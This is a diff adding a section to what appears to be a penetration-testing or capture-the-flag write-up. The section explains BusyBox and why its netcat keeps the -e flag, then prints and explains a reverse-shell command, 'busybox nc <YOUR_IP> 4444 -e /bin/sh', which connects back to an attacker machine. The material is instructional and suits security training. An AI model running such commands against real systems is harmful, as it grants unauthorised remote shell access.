@@ -1019,6 +1019,41 @@ You can also use `poc.py` but you'd have to:
 1:E{"digest":"4014292262"}
 ```
 
+###### What is BusyBox?
+
+**BusyBox** is a single, lightweight binary that bundles stripped-down versions of many standard Unix utilities (`ls`, `sh`, `wget`, etc.) into one executable.
+
+It is commonly found on minimal Linux environments, such as:
+
+- Embedded devices (IoT)
+- Docker containers
+- Stripped-down or hardened servers
+
+###### Why It Matters in Pentesting
+
+When attempting a reverse shell, standard implementations of `netcat` (`nc`) vary wildly across Linux distributions. Crucially, the **`-e` flag** (which executes a shell upon connection) is often compiled out for security reasons.
+
+|**Binary**|**Has -e flag?**|**Notes**|
+|---|---|---|
+|**`netcat-traditional`**|**Yes**|Rare on modern systems due to security risks.|
+|**`netcat-openbsd`**|**No**|Default on many modern distros (Ubuntu, Debian).|
+|**`busybox nc`**|**Yes**|Highly reliable fallback; almost always supports `-e`.|
+
+If you are going into a target blind and standard `nc` fails, `busybox nc` is a much safer assumption.
+
+**Breakdown**
+
+```
+busybox nc <YOUR_IP> 4444 -e /bin/sh
+```
+
+- **`busybox nc`**: Forces the system to use BusyBox's specific, feature-rich version of netcat rather than the system's default version.
+    
+- **`<YOUR_IP> 4444`**: Connects back to your attacker machine on the specified port.
+    
+- **`-e /bin/sh`**: Attaches a Bourne shell to the connection, granting you interactive command-line access upon success.
+
+
 Once the shell connects, query the DB(`reactor.db`) we found:
 
 
